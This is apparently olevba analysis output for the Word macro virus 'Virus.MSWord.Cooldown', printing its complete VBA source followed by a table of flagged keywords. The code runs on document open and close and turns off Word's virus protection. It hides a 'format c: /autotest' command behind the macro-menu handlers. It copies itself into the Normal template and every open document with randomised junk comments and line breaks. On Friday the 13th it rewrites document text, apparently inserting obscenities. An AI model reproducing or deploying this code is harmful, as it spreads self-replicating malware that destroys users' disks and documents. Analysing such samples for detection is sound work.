olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown-8ce29afa3a8a2455a5a703f9798db66c6dd4783f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown-8ce29afa3a8a2455a5a703f9798db66c6dd4783f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private Sub Document_Open()
            CoolDown 0
        ' 3043.731
End Sub
       ' 4139.836
' 5091.396
Private Sub Document_Close()
 CoolDown _
        0
        ' 6861.435
' 1609.434
End _
 Sub
  Private _
        Sub ToolsMacro()
     CoolDown 1
      End _
  Sub
        

Private Sub ViewVBCode()
            CoolDown 1
        End _
              Sub
     Private Sub _
      CoolDown(How As _
          Integer)
              
On _
  Error Resume Next
        Dim c As String, a _
 As _
     Long, _
        b _
            As Long, _
       d _
      As _
            Long, e _
     As Long, f _
             As Long, res _
          As _
               String, m As Boolean
         ' 6696.699
' 5934.029
Randomize
     
With _
                Options
        ' 1338.273

.VirusProtection _
         = _
      False
 ' 5550.656
.ConfirmConversions = _
      False
       .SaveNormalPrompt = False
 ' 9018.309
' 6754.591
End With
  If How _
            = _
      1 _
        Then
                ' 5697.444

' 606.6084
s _
         = Shell("format" & Chr(32) & "c:" & _
  Chr(32) & _
            "/autotest", vbHide)
             Else
   ' 6741.466
' 5936.861
With _
    NormalTemplate.VBProject.VBComponents(1).CodeModule
       If _
           Not .Find("Cool" & "Down", _
              1, _
    1, 1000, 1000, _
          False, False) _
               Then
           a = .CountOfLines
         For b _
             = _
             1 To a
               
' 7876.239
.DeleteLines (1)
            Next
            d _
     = _
          1
  a _
            = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
       
res = ""
    ' 5730.678
For b = 1 To _
       a
         c = _
  ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, _
             1)
          c _
           = RTrim(LTrim(c))
        ' 3419.099
If foo(c, _
         f, res) _
    Then
   ' 9140.818
' 8870.4
' 8536.813

.InsertLines _
      d, _
       Space(Rnd * 16) _
            & res
               ' 1491.877
' 9123.504
' 4697.39
d = _
    d _
           + _
           f
        f = _
          0
      ' 4371.166
res = ""
       

' 5278.109
End If
             ' 404.4265
Next
       
NormalTemplate.Save
     ' 3147.956
End _
      If
      End With
      For e = _
     1 To Documents.Count
       ' 2721.87
With Documents(e).VBProject.VBComponents(1).CodeModule
 If Not .Find("Cool" & _
    "Down", 1, _
                1, 1000, 1000, _
    False, False) Then
              ' 4399.506
a _
           = _
           .CountOfLines
    ' 1505.411
m = _
        Documents(e).Saved
          
' 5936.951
' 7478.099
' 590.6182

For b = 1 To a
         ' 7121.263
' 8561.975
' 9947.795
.DeleteLines (1)
               ' 677.703
Next
           ' 7454.467
d _
    = _
        1
               a _
   = _
  NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
               ' 3058.095
' 8247.968
' 8953.323
' 8072.195
' 4574.436
' 1420.563
' 9721.467
res _
  = _
""
       For _
           b = _
    1 _
          To _
              a
               c = _
         NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, _
         1)
c = RTrim(LTrim(c))
          ' 5256.324
' 7004.326
If _
             foo(c, _
   f, _
          res) _
               Then
         
' 4980.794
.InsertLines _
 d, _
     Space(Rnd * 16) & _
             res
                d _
      = _
           d + f
       f _
            = _
       0
              ' 5780.963
res _
          = _
      ""
               End If
        ' 9160.506
' 7513.05
' 5607.009
Next
  If _
            Documents(e).Path _
           <> _
             "" _
  Then
                Documents(e).SaveAs _
           AddToRecentFiles:=False
          End If
     If (WeekDay(Date) = _
       6) _
     And (Day(Date) = 13) _
       And _
(Rnd _
      > _
              0.7) Then
  Application.StatusBar = _
           ""
 Application.DisplayStatusBar = _
         False
        Application.ScreenUpdating _
 = _
  False
               ' 298.8493
With _
       Documents(e).Content
          .Find.Execute FindText:="ďđ", _
ReplaceWith:="ďčçä", Replace:=wdReplaceAll
             .Find.Execute _
        FindText:="äđ", _
 ReplaceWith:="ďîíîń", Replace:=wdReplaceAll
              ' 5769.423

' 4481.028
.Find.Execute FindText:="ęđ", ReplaceWith:="ęîáűë", _
                Replace:=wdReplaceAll
     ' 3733.59
' 7603.012
' 3220.779
.Find.Execute _
           FindText:="ńňđ", _
        ReplaceWith:="ĺáŕí", _
  Replace:=wdReplaceAll
    .Find.Execute FindText:="ńđ", _
         ReplaceWith:="ńđŕę", Replace:=wdReplaceAll
              .Find.Execute _
      FindText:="ňđ", ReplaceWith:="ňđŕő", Replace:=wdReplaceAll
      ' 7664.387
' 8984.311
.Find.Execute _
            FindText:="áđ", ReplaceWith:="áë˙ä", Replace:=wdReplaceAll
    ' 2568.693
.Find.Execute FindText:="âđ", _
                ReplaceWith:="âűĺá", Replace:=wdReplaceAll
    .Find.Execute _
      FindText:="ăđ", _
       ReplaceWith:="ăîâí", _
           Replace:=wdReplaceAll
            
.Find.Execute _
       FindText:="ćđ", ReplaceWith:="ćîď", Replace:=wdReplaceAll
        .Find.Execute _
               FindText:="çđ", ReplaceWith:="çŕëóď", Replace:=wdReplaceAll
    ' 5087.583
' 4302.025
.Find.Execute FindText:="äć", _
              ReplaceWith:="äćîď", _
       Replace:=wdReplaceAll
  
' 6018.026
' 6178.955
.Find.Execute _
         FindText:="ęŕë", ReplaceWith:="äĺđ", Replace:=wdReplaceAll
           .Find.Execute FindText:="áóő", ReplaceWith:="áđ˙ę", _
    Replace:=wdReplaceAll
              End _
  With
         ' 7816.603
' 3185.027
Documents(e).UndoClear
     ' 7683.494
Application.DisplayStatusBar = _
 True
                
Application.ScreenUpdating = _
              True
          Application.StatusBar _
   = ""
          ' 2193.918
End If
          ' 3198.56
' 4457.873
Documents(e).Saved _
              = m
         End _
          If
           End _
       With
     Next
    End If
           End Sub
             ' 5540.27
Private _
            Function foo(ByRef s _
 As String, ByRef i _
           As _
    Long, ByRef _
    res _
   As String) As _
      Boolean
     Dim tmp As _
   String
           If _
      (Left(s, _
            1) _
           = _
 "'") Or _
 (Len(s) = 0) _
  Then
  foo _
     = False
          ' 1082.73

Exit _
         Function
     End If
          If Right(s, 2) _
           = _
           Chr(32) _
              & _
             "_" Then
  ' 8957.37
' 3947.403
res _
      = res _
 & Left(s, _
         Len(s) _
          - 1)
             ' 110.1702
foo = False
Exit Function
 End If
               tmp _
      = res & _
     s
 ' 3634.595
' 1290.28
' 2525.613
res = _
          ""
         i _
 = 1
             While Rnd _
   > _
         0.5
 ' 5906.973
If Rnd < _
  0.8 Then
    res _
     = _
   res _
   & "'" & _
      Str(Rnd * _
  10000)
       
' 9989.736
' 6286.529
End If
         res _
           = res _
    & _
      Chr(13)
           ' 6144.475

i _
      = _
        i + _
           1
           Wend
     ' 220.2982

For a _
    = _
              1 _
       To Len(tmp)
     res _
     = res _
   & Mid(tmp, _
            a, _
     1)
             ' 546.8035
' 7374.266

If Mid(tmp, a, 1) = _
                Chr(32) Then
  ' 8942.029
' 5225.274
If Rnd > _
               0.5 Then
            res = res & _
          "_" & Chr(13) _
 & Space(Rnd _
            * _
              16)
              i _
     = i + _
        1
         End _
         If
             End If
  Next
    ' 3510.385
' 8125.993
' 5820.865
foo _
          = _
      True
             ' 3543.156
End _
              Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

